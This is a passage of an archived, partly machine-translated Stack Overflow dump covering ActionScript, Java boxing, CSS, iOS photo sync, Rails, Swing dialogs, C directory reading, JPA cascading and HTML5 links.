on(release){ stopDrag(); } 
```

*   movieClip, instance name : box2, has the same code.
*   there identity is being passed to the function through "this._name"

Finally, here is the code for the function. I trace "b" in order to know its value. Added startDrag() to be able to drag the movieclip. "How can I able to trace "--drag "+b while dragging the movieclip?"

Thank you in advance. I have thought of using this code. Is this allowed?

```
function functionName(b){

    trace(b+" selected.");
    startDrag(b);

    b.onMouseMove = function(){        // <---- please help
        trace("--drag "+b);
    }   
} 
```

The code may look simple and useless :) This is not really the code I am working with. I am just trying to get the proper line to execute onmousemove inside a function.

```
function functionName(param_var){    
    object.eventMethod = function () {
        // some code here.
    }
} 
```

**CAN I MAKE USE OF THE PARAMETER VARIABLE AS OBJECT?**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T21:39:20.153

您可能应该以不同的方式构建代码。这是一个例子：

```
//Import Delegate
import mx.utils.Delegate;

//First you set the event with Relegate which will prevent from Flash scope problems
box1.onPress = Delegate.create(this, onBoxPressed);
box1.onPress.currentBox = box1;
box1.onRelease = Delegate.create(this, onBoxReleased);
box1.onRelease.currentBox = box1
box2.onPress = Delegate.create(this, onBoxPressed);
box2.onPress.currentBox = box2;
box2.onRelease = Delegate.create(this, onBoxReleased);
box2.onRelease.currentBox = box2;

//Function executed when the box is pressed
function onBoxPressed():Void {
    var box:MovieClip = arguments.caller.currentBox;
    box.startDrag();
    box.onMouseMove = Delegate.create(this, onMouseMoved);
}

//Function executed when the box is released
function onBoxReleased():Void {
    var box:MovieClip = arguments.caller.currentBox;
    delete box.onMouseMove;
    box.stopDrag();
}

//Function executed when the box is pressed and the mouse moves
function onMouseMoved():Void {
    trace("I'm moving my box");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-10T08:44:04.680

我设法找到了答案。感谢您查看我的帖子。

```
//Having function that would dynamically manage parameters into object
//given that the object is found in the ROOT.

function myFunction(param_var) {
    // _root[param_var] => can be use as an Object regards to the parameter
    _root[param_var].eventMehtod= function(){    
        // some code here;
    } 
} 
```

# java - declaring using a variable using new vs normal decleration and nature of Integer ( boxing / unboxing)

> ID：11736047
> 
> 赞同：0
> 
> 时间：2012-07-31T08:29:18.070
> 
> 标签：java, integer, int

Guys can anybody explain me this nature of new and the use of Integer

```
Integer i = new Integer(-10);
Integer j = new Integer(-10);
Integer k = -10;
Integer l=-10;
System.out.println(i==j);
System.out.println(k==l); 
```

answer is false true

next

```
 Integer a=128;
    Integer b=128;
    Integer c=127;
    Integer d=127;
    System.out.println(a==b);
    System.out.println(c==d); 
```

answer am getting is false true. Can anybody explain this nature. thanks in advance :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:31:07.820

In your first example, you're *always* creating new `Integer` objects and assigning those references to `i` and `j`. For `k` and `l` you're using autoboxing, which *sometimes* creates new objects and *sometimes* doesn't.

In your second example, you're *just* using autoboxing - but with different values, which demonstrates the "sometimes" from above.

From [section 5.1.7 of the JLS](http://docs.oracle.com/javase/specs/jls/se7/html/jls-5.html#jls-5.1.7):

> If the value p being boxed is true, false, a byte, or a char in the range \u0000 to \u007f, or an int or short number between -128 and 127 (inclusive), then let r1 and r2 be the results of any two boxing conversions of p. It is always the case that r1 == r2.
> 
> Ideally, boxing a given primitive value p, would always yield an identical reference. In practice, this may not be feasible using existing implementation techniques. The rules above are a pragmatic compromise. The final clause above requires that certain common values always be boxed into indistinguishable objects. The implementation may cache these, lazily or eagerly. For other values, this formulation disallows any assumptions about the identity of the boxed values on the programmer's part. This would allow (but not require) sharing of some or all of these references.
> 
> This ensures that in most common cases, the behavior will be the desired one, without imposing an undue performance penalty, especially on small devices. Less memory-limited implementations might, for example, cache all char and short values, as well as int and long values in the range of -32K to +32K.

# css - Position on ::after in table-cell doesn't work in Firefox?

> ID：11736050
> 
> 赞同：2
> 
> 时间：2012-07-31T08:29:28.597
> 
> 标签：css

The following code should create a pseudo-element which spans 100% of its parent element's width. However this won't work in Firefox, it does work in Chrome. Firefox seems to ignore the `.parent`'s `position:relative`. Is this a bug?

**HTML**

```
<div class="parent">

</div> 
```

**CSS**

```
.parent{
  background:red;
  width:100px;
  height:100px;
  position:relative;
  display:table-cell;
}

.parent:after{
left:0;
  content:'';
  right:0;
  top:10px;
  height:20px;
  background:green;
  position:absolute;
} 
```

[Live demo](http://tinkerbin.com/9eEVN6Pj)

See this images in **chrome** ![enter image description here](../Images/93135f7e00a4d8c6ba7ad7c49a18e35c.png)

and now see this result in **firefox**

* * *

![enter image description here](../Images/29b5fcc9554aee2cfbd462605be611ad.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:38:45.813

如果可能，将 更改`display:table-cell`为`block`或`inline-block`以修复此错误。或者，`position:relative`将父级更改为`absolute`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T09:04:16.770

给`width`

```
 .parent:after{
      left:0;
      content:'';
      right:0;
      top:10px;
      width:100px;
      height:20px;
      background:green;
      position:absolute;
} 
```

# objective-c - Storing and synchronising images with iOS

> ID：11736051
> 
> 赞同：0
> 
> 时间：2012-07-31T08:29:29.767
> 
> 标签：objective-c, ios, xamarin.ios, synchronization

I have an application that is written in `Monotouch` and one function that it offers is taking photos that are then synchronized back to a `Sybase Sql Anywhere` database on our server. This mechanism is working fine on the `Windows` version of our application, but on `iOS` we have hit technical issues pertaining to saving the photos in the `Sybase Ultralite` database on the iPad or iPhone. Very briefly, the photos are saving correctly if we set the resolution to VERY low on an iPhone, but failing if the resolution is higher. The issue is related to the size of the image data that is being saved. On an `iPad`, the photos are generally larger than those taken with an `iPhone`, so saving to the database is failing more often on `iPad` than `iPhone`.

Anyway, that is just some background to our situation and the actual `Ultralite` issue is not the focus of this question. What I am looking for here is *alternative solutions* (`Objective-C` or `Monotouch`) for providing this functionality. I immediately think about saving to a local database and then replicating the photo data back to the server because I have a lot of experience with database replication. But maybe there is a better way of solving this?

The solution must allow the application to:

*   Save a photo so that it is available locally (even after shutdown of the application or restart of the device)
*   Must allow photos to taken and saved offline, because an internet connection is not always available.
*   Either synchronize the image data back to the server database or synchronize a URL back that the application in the back-office can retrieve the photo. Obviously, at the point of synchronization the application must be online.

Can anyone suggest solutions or API's that might allow me to provide this functionality without having to synchronize the image data? I am thinking along the lines of maybe saving the image to the cloud and then synchronizing only a URL that can be used in the back-office to retrieve the photo. Any suggestions?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:52:26.857

根据您所写的内容，我可能会建议您不要在 iOS 设备上正确保留图像。它们上的内存非常有限，将批量 HR 图像保存在 RAM 中会导致内存警告和应用程序崩溃。您应该考虑使用`CoreData`来存储指向正在保存到磁盘的图像的本地链接。我想，您熟悉`UIImagePickerController`委托回调，它允许您检索 UIImage 并将其保存到应用程序的 Documents 目录中，因此我将其省略。我不确定“必须允许离线拍摄和保存照片”是什么意思，因为既不`UIImagePickerController`也不`AVFoundation`依赖于互联网连接。因此，为了离线保存图像，只需使用其中一种（`UIImagePickerController`更可取的是，如果您不需要在相机屏幕上显示任何自定义 UI，并且更容易开始使用）。如果您需要同时同步多个图像，您应该显示一个 UIProgressBar 并在队列中上传图像，而您发出的每个 REST 请求都是用于一次上传单个图像的多部分数据请求。这样你就不会在内存管理上有任何问题，你也可以使用 HR 质量来拍摄图像，不需要使用最低的。对于 HTTP 连接，您可能需要考虑使用[ASIHTTPRequest](http://allseeing-i.com/ASIHTTPRequest/)，因为它很简单，使用起来非常简单，并且可能会为您节省一些处理多部分请求的时间。

# ruby-on-rails - rails : User button to join / leave a team

> ID：11736057
> 
> 赞同：0
> 
> 时间：2012-07-31T08:29:45.043
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, activerecord

Currently, I get two tables :

```
Users (with a foreign_key : team_id) 
Teams 
```

Relationships : one-to-many (a user can have only 1 team, but a team car have many users)

```
Users :   belongs_to :teams
Teams:     has_many :users

class Team < ActiveRecord::Base
    has_many :users

class User < ActiveRecord::Base
  belongs_to :teams 
```

config/routes.rb

```
 get "users/new"
  resources :users
  resources teams do
    member do
      get 'join'
      get 'leave'
    end
  end
 resources :sessions, only: [:new, :create, :destroy]
   match '/signin',  to: 'sessions#new'
  match '/signout', to: 'sessions#destroy', via: :delete

  match '/users', to: 'users#index'

  match '/teams', to: 'teams#index'
end 
```

And I try to make a button on the team page (e.g. `myapp/teams/1`) where a user (who call `current_user`) can join or leave this team.

To join a team we just have to update the column `user.team_id` and put on this the id of the team (to leave a team, the column `user.team_id` need to be empty).

Anyone have an idea to make these two buttons?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T09:04:43.297

您需要在团队控制器中执行两个操作。

```
def join
  @team = Team.find params[:id]
  current_user.update_attribute(:team_id, @team.id)
  redirect_to @team
end

def leave
  @team = Team.find params[:id]
  current_user.update_attribute(:team_id, nil)
  redirect_to @team
end 
```

在路线中

```
resources :teams do
  member do
    get 'join'
    get 'leave'
  end
end 
```

和显示视图中的链接

```
<%= link_to 'join', join_team_path(@team) %>
<%= link_to 'leave', leave_team_path(@team) %> 
```

更新

请注意，此代码假定您已经分别拥有`resources :teams`路由和团队控制器。如果没有，您将需要进行一些修改。

更新

`sign_in current_user`如果使用设计，您还需要

# java - JDialog 拒绝关闭

> ID：11736058
> 
> 赞同：0
> 
> 时间：2012-07-31T08:29:49.737
> 
> 标签：java, swing, dispose, jdialog

我正忙着制作一个基本的 Java 文字处理器作为个人项目，它包括一个弹出式 JDialog。但是，当用户单击“取消”按钮时，JDialog 拒绝关闭，关闭它的唯一方法是使用框架本身的关闭按钮。同样，当“确认”按钮被激活时，任务完成但 JDialog 保持打开状态。任何人都可以帮忙吗？我的 JDialog 初始化代码：

```
 package cword;

    import java.awt.*;
    import java.awt.event.*;
    import java.io.*;
    import javax.swing.*;
    import javax.swing.border.*;

    public class AlreadyExists extends JDialog
    {
        public static final long serialVersionUID = 1L;
        public AlreadyExists(Frame owner, String pathname, String filename, boolean includedExtension)
        {
            super(owner);
            initComponents(pathname, filename, includedExtension);
        }

        private void initComponents(final String pathname, String filename, final boolean includedExtension)
        {
            dialogPane = new JPanel();
            contentPanel = new JPanel();
            label1 = new JLabel();
            buttonBar = new JPanel();
            okButton = new JButton();
            cancelButton = new JButton();

            setTitle("Confirm Overwrite");
            Container contentPane = getContentPane();
            contentPane.setLayout(new BorderLayout());

            {

                dialogPane.setLayout(new BorderLayout());

                {
                    contentPanel.setLayout(null);

                    label1.setText("File " + filename + " already exists. Are you sure you want to overwrite?");
                    contentPanel.add(label1);
                    label1.setBounds(new Rectangle(new Point(0, 5), label1.getPreferredSize()));

                    {
                        Dimension preferredSize = new Dimension();
                        for(int i = 0; i < contentPanel.getComponentCount(); i++) {
                            Rectangle bounds = contentPanel.getComponent(i).getBounds();
                            preferredSize.width = Math.max(bounds.x + bounds.width, preferredSize.width);
                            preferredSize.height = Math.max(bounds.y + bounds.height, preferredSize.height);
                        }
                        Insets insets = contentPanel.getInsets();
                        preferredSize.width += insets.right;
                        preferredSize.height += insets.bottom;
                        contentPanel.setMinimumSize(preferredSize);
                        contentPanel.setPreferredSize(preferredSize);
                    }
                }
                dialogPane.add(contentPanel, BorderLayout.CENTER);

                {
                    buttonBar.setBorder(new EmptyBorder(12, 0, 0, 0));
                    buttonBar.setLayout(new GridBagLayout());
                    ((GridBagLayout)buttonBar.getLayout()).columnWidths = new int[] {0, 85, 80};
                    ((GridBagLayout)buttonBar.getLayout()).columnWeights = new double[] {1.0, 0.0, 0.0};

                    okButton.setText("Confirm");
                    buttonBar.add(okButton, new GridBagConstraints(1, 0, 1, 1, 0.0, 0.0,
                        GridBagConstraints.CENTER, GridBagConstraints.BOTH,
                        new Insets(0, 0, 0, 5), 0, 0));

                    cancelButton.setText("Cancel");
                    buttonBar.add(cancelButton, new GridBagConstraints(2, 0, 1, 1, 0.0, 0.0,
                        GridBagConstraints.CENTER, GridBagConstraints.BOTH,
                        new Insets(0, 0, 0, 0), 0, 0));
                }
                dialogPane.add(buttonBar, BorderLayout.SOUTH);
            }
            contentPane.add(dialogPane, BorderLayout.CENTER);
            pack();
            setLocationRelativeTo(getOwner());
            setDefaultCloseOperation(2);
            setModalityType(Dialog.ModalityType.APPLICATION_MODAL);
            setVisible(true);
            okButton.addActionListener(new ActionListener()
            {
                public void actionPerformed(ActionEvent ae)
                {
                    write(pathname, includedExtension);
                    close();
                }
            });
            cancelButton.addActionListener(new ActionListener()
            {
                public void actionPerformed(ActionEvent ae)
                {
                    close();
                }
            });
        }

        private void write(String pathname, boolean includedExtension)
                {
            if(includedExtension)
            {
                try
                {
                    BufferedWriter writer;
                    writer = new BufferedWriter(new FileWriter(pathname));
                    writer.write(CWord.textArea1.getText());
                    writer.close();
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }
            else if(!includedExtension)
            {
                try
                {
                    BufferedWriter writer;
                    writer = new BufferedWriter(new FileWriter(pathname + ".txt"));
                    writer.write(CWord.textArea1.getText());
                    writer.close();
                }
                catch(Exception e)
                {
                    e.printStackTrace();
                }
            }
        }
        private void close()
        {
            dispose();
            dispatchEvent(new WindowEvent(this, WindowEvent.WINDOW_CLOSING));
        }

        private JPanel dialogPane;
        private JPanel contentPanel;
        private JLabel label1;
        private JPanel buttonBar;
        private JButton okButton;
        private JButton cancelButton;
    } 
```

在 CWord.class 中调用它的行之一：

```
 new AlreadyExists(this, file.getAbsolutePath(), file.getName(), true); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T18:38:26.363

好吧，这是一个艰难的，但我终于想通了！

这是你的问题。您在调用s*后将*`ActionListener`s 添加到按钮中。由于这是一个模态对话框，因此是 EDT 上的阻塞调用。这意味着 after 的代码直到对话框关闭后才执行，因此s 直到对话框关闭后才被添加到按钮中。*`setVisible(true)``setVisible(true)``setVisible(true)``ActionListener`*

 *`setVisible()`当它是一个模态对话框时，您应该始终在执行所有 GUI 初始化之后调用。因此，只需`setVisible(true)`在调用`addActionListener`按钮后移至，您就可以开始了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:34:35.947

绝对不需要实现自己的对话框。

围绕这个计划你的代码：

```
int choice = JOptionPane.showConfirmDialog(parentComponent, "Are you sure you want to overwrite?", "File Already Exists", JOptionPane.OK_CANCEL_OPTION);

 if(choice == JOptionPane.OK_OPTION){
     // okay
 } else {
     // cancelled
 } 
```

**在此处阅读更多内容：** [如何制作对话框 - Java 教程 # 自定义按钮文本](http://docs.oracle.com/javase/tutorial/uiswing/components/dialog.html#button)*

# c - How to read all files in a folder using C

> ID：11736060
> 
> 赞同：20
> 
> 时间：2012-07-31T08:30:04.837
> 
> 标签：c, linux, file, io, directory

I wish to read all the text files in a particular folder. The files' names do not have any common pattern in them- else the task would have been easier.

```
//read a file from the directory  
//Perform a common operation  
//write output to a common file  
//read the next file 
```

It will be good if I could work around with sub-folders as well, but even the basic implementation is sufficient.

I tried looking at the previously asked related questions ([here](https://stackoverflow.com/q/2918579/1295278), [here](https://stackoverflow.com/q/1844688/1295278), [here](https://stackoverflow.com/q/5840443/1295278) and [here](https://stackoverflow.com/q/5426398/1295278)), but none of them give a C and Linux specific answer which I need.

**edit** : So, this is what I wrote based on the answers received-

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>

int main(int argc, char **argv)
{
    DIR* FD;
    struct dirent* in_file;
    FILE    *output_file;
    FILE    *entry_file;
    char    buffer[BUFSIZ];

    /* Opening common file for writing */
    output_file = fopen("/home/pnp/snort_rules_folder/rulesoutput.txt", "a+");
    if (output_file == NULL)
    {
        fprintf(stderr, "Error : Failed to open output_file\n");

        return 1;
    }

    /* Scanning the in directory */
    if (NULL == (FD = opendir ("/home/pnp/snort_rules_folder/rules"))) 
    {
        fprintf(stderr, "Error : Failed to open input directory\n");
        fclose(output_file);

        return 1;
    }
    while ((in_file = readdir(FD))) 
    {
        /* On linux/Unix we don't want current and parent directories
         * If you're on Windows machine remove this two lines
         */
        if (!strcmp (in_file->d_name, "."))
            continue;
        if (!strcmp (in_file->d_name, ".."))    
            continue;
        /* Open directory entry file for common operation */
        /* TODO : change permissions to meet your need! */
        entry_file = fopen(in_file->d_name, "r");
        if (entry_file == NULL)
        {
            fprintf(stderr, "Error : Failed to open entry file\n");
            fclose(output_file);

            return 1;
        }

        /* Doing some stuff with entry_file : */

        while (fgets(buffer, BUFSIZ, entry_file) != NULL)
        {
            /* Use fprintf or fwrite to write some stuff into common_file*/
        }

    fprintf(output_file, "reading file %s", in_file->d_name);

        /* When you finish with the file, close it */
        fclose(entry_file);
    }

    /* Don't forget to close common file before leaving */
    fclose(output_file);

    return 0;
     } 
```

And the error received-
pnp@pnp-laptop:~/snort_rules_folder$ ./a.out
Error : Failed to open entry file

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-31T09:56:02.467

您可以使用此示例代码并在需要时对其进行修改：

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>

/* This is just a sample code, modify it to meet your need */
int main(int argc, char **argv)
{
    DIR* FD;
    struct dirent* in_file;
    FILE    *common_file;
    FILE    *entry_file;
    char    buffer[BUFSIZ];

    /* Openiing common file for writing */
    common_file = fopen(path_to_your_common_file, "w");
    if (common_file == NULL)
    {
        fprintf(stderr, "Error : Failed to open common_file - %s\n", strerror(errno));

        return 1;
    }

    /* Scanning the in directory */
    if (NULL == (FD = opendir (in_dir))) 
    {
        fprintf(stderr, "Error : Failed to open input directory - %s\n", strerror(errno));
        fclose(common_file);

        return 1;
    }
    while ((in_file = readdir(FD))) 
    {
        /* On linux/Unix we don't want current and parent directories
         * On windows machine too, thanks Greg Hewgill
         */
        if (!strcmp (in_file->d_name, "."))
            continue;
        if (!strcmp (in_file->d_name, ".."))    
            continue;
        /* Open directory entry file for common operation */
        /* TODO : change permissions to meet your need! */
        entry_file = fopen(in_file->d_name, "rw");
        if (entry_file == NULL)
        {
            fprintf(stderr, "Error : Failed to open entry file - %s\n", strerror(errno));
            fclose(common_file);

            return 1;
        }

        /* Doing some struf with entry_file : */
        /* For example use fgets */
        while (fgets(buffer, BUFSIZ, entry_file) != NULL)
        {
            /* Use fprintf or fwrite to write some stuff into common_file*/
        }

        /* When you finish with the file, close it */
        fclose(entry_file);
    }

    /* Don't forget to close common file before leaving */
    fclose(common_file);

    return 0;
} 
```

希望这个地狱。

问候。

# jpa - a new object was found through a relationship that was not marked cascade PERSIST

> ID：11736061
> 
> 赞同：36
> 
> 时间：2012-07-31T08:30:12.417
> 
> 标签：jpa, orm, annotations, many-to-many, jpql

In trying to get a `@OneToMany` relationship between `Article` and `HeaderField` I probably have the mapping not quite right, resulting in:

```
init:
Deleting: /home/thufir/NetBeansProjects/USENET/build/built-jar.properties
deps-jar:
Updating property file: /home/thufir/NetBeansProjects/USENET/build/built-jar.properties
compile:
run:
DEBUG: nntp: newsrc loading /home/thufir/.newsrc
DEBUG: nntp: newsrc load: 1 groups in 31ms
[EL Info]: 2012-07-31 02:05:05.677--ServerSession(8979162)--EclipseLink, version: Eclipse Persistence Services - 2.3.0.v20110604-r9504
[EL Info]: 2012-07-31 02:05:06.778--ServerSession(8979162)--file:/home/thufir/NetBeansProjects/USENET/build/classes/_USENETPU login successful
[EL Warning]: 2012-07-31 02:05:06.903--ServerSession(8979162)--Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Table 'usenet.HEADERFIELD' doesn't exist
Error Code: 1146
Call: ALTER TABLE HEADERFIELD DROP FOREIGN KEY FK_HEADERFIELD_ARTICLE_ID
Query: DataModifyQuery(sql="ALTER TABLE HEADERFIELD DROP FOREIGN KEY FK_HEADERFIELD_ARTICLE_ID")
[EL Warning]: 2012-07-31 02:05:06.916--ServerSession(8979162)--Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown table 'ARTICLE'
Error Code: 1051
Call: DROP TABLE ARTICLE
Query: DataModifyQuery(sql="DROP TABLE ARTICLE")
[EL Warning]: 2012-07-31 02:05:07.033--ServerSession(8979162)--Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown table 'NEWSGROUP'
Error Code: 1051
Call: DROP TABLE NEWSGROUP
Query: DataModifyQuery(sql="DROP TABLE NEWSGROUP")
[EL Warning]: 2012-07-31 02:05:07.122--ServerSession(8979162)--Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.3.0.v20110604-r9504): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException: Unknown table 'HEADERFIELD'
Error Code: 1051
Call: DROP TABLE HEADERFIELD
Query: DataModifyQuery(sql="DROP TABLE HEADERFIELD")
[EL Warning]: 2012-07-31 02:05:08.921--UnitOfWork(26970615)--java.lang.IllegalStateException: During synchronization a new object was found through a relationship that was not marked cascade PERSIST: null.
Jul 31, 2012 2:05:08 AM net.bounceme.dur.usenet.driver.Main main
SEVERE: null
javax.persistence.RollbackException: java.lang.IllegalStateException: During synchronization a new object was found through a relationship that was not marked cascade PERSIST: null.
    at org.eclipse.persistence.internal.jpa.transaction.EntityTransactionImpl.commitInternal(EntityTransactionImpl.java:102)
    at org.eclipse.persistence.internal.jpa.transaction.EntityTransactionImpl.commit(EntityTransactionImpl.java:63)
    at net.bounceme.dur.usenet.driver.Main.persistArticle(Main.java:67)
    at net.bounceme.dur.usenet.driver.Main.<init>(Main.java:43)
    at net.bounceme.dur.usenet.driver.Main.main(Main.java:24)
Caused by: java.lang.IllegalStateException: During synchronization a new object was found through a relationship that was not marked cascade PERSIST: null.
    at org.eclipse.persistence.internal.sessions.RepeatableWriteUnitOfWork.discoverUnregisteredNewObjects(RepeatableWriteUnitOfWork.java:302)
    at org.eclipse.persistence.internal.sessions.UnitOfWorkImpl.calculateChanges(UnitOfWorkImpl.java:695)
    at org.eclipse.persistence.internal.sessions.UnitOfWorkImpl.commitToDatabaseWithChangeSet(UnitOfWorkImpl.java:1482)
    at org.eclipse.persistence.internal.sessions.RepeatableWriteUnitOfWork.commitRootUnitOfWork(RepeatableWriteUnitOfWork.java:265)
    at org.eclipse.persistence.internal.sessions.UnitOfWorkImpl.commitAndResume(UnitOfWorkImpl.java:1135)
    at org.eclipse.persistence.internal.jpa.transaction.EntityTransactionImpl.commitInternal(EntityTransactionImpl.java:84)
    ... 4 more

[EL Info]: 2012-07-31 02:05:09.332--ServerSession(8979162)--file:/home/thufir/NetBeansProjects/USENET/build/classes/_USENETPU logout successful
BUILD SUCCESSFUL (total time: 9 seconds) 
```

Article:

```
package net.bounceme.dur.usenet.model;

import java.io.Serializable;
import java.util.AbstractMap.SimpleEntry;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.mail.Header;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.persistence.*;

@Entity
public class Article implements Serializable {

    private static final long serialVersionUID = 1L;
    private static final Logger LOG = Logger.getLogger(Article.class.getName());
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @Column
    private String subject;
    @OneToMany(mappedBy = "article", cascade = CascadeType.PERSIST)
    private List<HeaderField> headerFields = new ArrayList<>();

    public Article() {
    }

    public Article(Message message) {
        try {
            subject = message.getSubject();
            Enumeration e = message.getAllHeaders();

            while (e.hasMoreElements()) {
                Header header = (Header) e.nextElement();
                @SuppressWarnings("unchecked")
                SimpleEntry nameValue = new SimpleEntry(header.getName(), header.getValue());
                HeaderField headerField = new HeaderField(nameValue);
                headerFields.add(headerField);
            }
        } catch (MessagingException ex) {
            Logger.getLogger(Article.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    @Override
    public int hashCode() {
        int hash = 0;
        hash += (id != null ? id.hashCode() : 0);
        return hash;
    }

    @Override
    public boolean equals(Object object) {
        // TODO: Warning - this method won't work in the case the id fields are not set
        if (!(object instanceof Article)) {
            return false;
        }
        Article other = (Article) object;
        if ((this.id == null && other.id != null) || (this.id != null && !this.id.equals(other.id))) {
            return false;
        }
        return true;
    }

    @Override
    public String toString() {
        return subject;
    }

    public String getSubject() {
        return subject;
    }

    public void setSubject(String subject) {
        this.subject = subject;
    }
} 
```

HeaderField:

```
package net.bounceme.dur.usenet.model;

import java.io.Serializable;
import java.util.AbstractMap.SimpleEntry;
import java.util.logging.Logger;
import javax.persistence.*;

@Entity
public class HeaderField implements Serializable {

    private static final long serialVersionUID = 1L;
    private static final Logger LOG = Logger.getLogger(HeaderField.class.getName());
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    @ManyToOne
    private Article article = new Article();
    @Column
    private String headerName;
    @Column
    private String headerValue;

    public HeaderField() {
    }

    public HeaderField(SimpleEntry nameValue) {
        headerName = nameValue.getKey().toString();
        headerValue = nameValue.getValue().toString();
    }

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

    @Override
    public int hashCode() {
        int hash = 0;
        hash += (id != null ? id.hashCode() : 0);
        return hash;
    }

    @Override
    public boolean equals(Object object) {
        // TODO: Warning - this method won't work in the case the id fields are not set
        if (!(object instanceof HeaderField)) {
            return false;
        }
        HeaderField other = (HeaderField) object;
        if ((this.id == null && other.id != null) || (this.id != null && !this.id.equals(other.id))) {
            return false;
        }
        return true;
    }

    @Override
    public String toString() {
        return "\n\nheaderName\t" + headerName + "\nheaderValue\t" + headerValue;
    }

    public String getHeaderName() {
        return headerName;
    }

    public void setHeaderName(String headerName) {
        this.headerName = headerName;
    }

    public String getHeaderValue() {
        return headerValue;
    }

    public void setHeaderValue(String headerValue) {
        this.headerValue = headerValue;
    }
} 
```

The entities have been updated to reflect suggestion to use `CascadeType.PERSIST` which, seemingly, would fix that particular error message. I'm working on generating a more useful log to trace what's happening.

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2012-07-31T08:39:48.477

您可能所做的是创建了 Article 的新实例和 HeaderField 的一些新实例。然后将 HeaderField 的这些实例与 Article 相关联。

之后尝试持久文章失败，因为如错误消息所述，它指的是新对象并且关系未标记为 PERSIST。此外，根据您的日志，这些 HeaderField 实例没有设置*headerName*和*headerValue*。

你有两个选择：

1.  通过 em.persist 还保留文章中引用的其他实例
2.  从 Article 到 HeaderFields 的级联持久化操作如下

    ```
    OneToMany(mappedBy = "article", cascade = CascadeType.PERSIST)  
    private List<HeaderField> someOrAllHeaderFields = new ArrayList<>(); 
    ```

此外，您不应删除无参数构造函数。`JPA`实现总是在创建实例时调用此构造函数。

但是您可以使无参数构造函数受到保护。在 JPA 2.0 规范中，这是用以下词语告诉我们的：

> 实体类必须有一个无参数构造函数。实体类也可能有其他构造函数。无参数构造函数必须是公共的或受保护的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-12-03T10:34:03.200

只需在您的关系上添加 CascadeType.ALL

```
OneToMany(mappedBy = "article", cascade = CascadeType.ALL)  
private List<HeaderField> someOrAllHeaderFields = new ArrayList<>(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-03-25T08:41:33.467

我删除了级联属性，它对我有用：

```
OneToMany(mappedBy = "article")  
private List<HeaderField> someOrAllHeaderFields = new ArrayList<>(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-11-11T03:06:36.780

JPA 默认不提供级联功能。所以在我的情况下，级联注释丢失了，所以我用`@ManyToOne`注释定义了它。请定义级联类型以及`@ManyToOne`

前任：

```
@ManyToOne(cascade = CascadeType.PERSIST)
    private Article article = new Article(); 
```

# html - html5 block link styling issues

> ID：11736062
> 
> 赞同：2
> 
> 时间：2012-07-31T08:30:18.567
> 
> 标签：html, css, background-color

Hi HTML5 / css guru'es

I'm trying to make use of some "new" features presented by HTML5 however I have stumpled uppon a problem with changing my links background on hover when having block elements inside the tag.

This is my test code:

```
<!doctype html>
<html>
<head>
    <meta charset="utf-8" />
    <title>teeeest</title>
    <link rel="stylesheet" href="saninetto1/css/bootstrap.min.css" />
    <style>
        a:link  { background-color: red; }
        a:hover { background-color: #333; }
    </style>
</head>

<body>
        <div><a href="#">I'm a block</a></div><br />
        <a href="#2"><div>I'm a block 2</div></a>
    </body>
</html> 
```

According to html5doctor ([article](http://html5doctor.com/block-level-links-in-html-5/)) it should be straight forward but I just can't change the background on when hovering.

I made this fiddle to show the difference when using my test html: [http://jsfiddle.net/vJEEn/](http://jsfiddle.net/vJEEn/)

As the fiddle shows I can make changes to the text, but not the background-color

hope you can help me changing the background on hover

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:43:45.687

在您的代码中添加此 CSS 属性。

```
a { display: block;} 
```

我想这就是你要找的。

[测试代码](http://jsfiddle.net/GZCcC/3/)

更好的选择：

```
a { display: inline-block;} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T08:40:41.457

您的代码中的微小更改在我的所有浏览器中都有效。代码是：

```
<!doctype html>
<html>
<head>
<meta charset="utf-8" />
<title>teeeest</title>
<link rel="stylesheet" href="saninetto1/css/bootstrap.min.css" />
<style>
    a:link  { background-color: red; }
    a:hover { background-color: #333; color: red;}
</style>
</head>

<body>
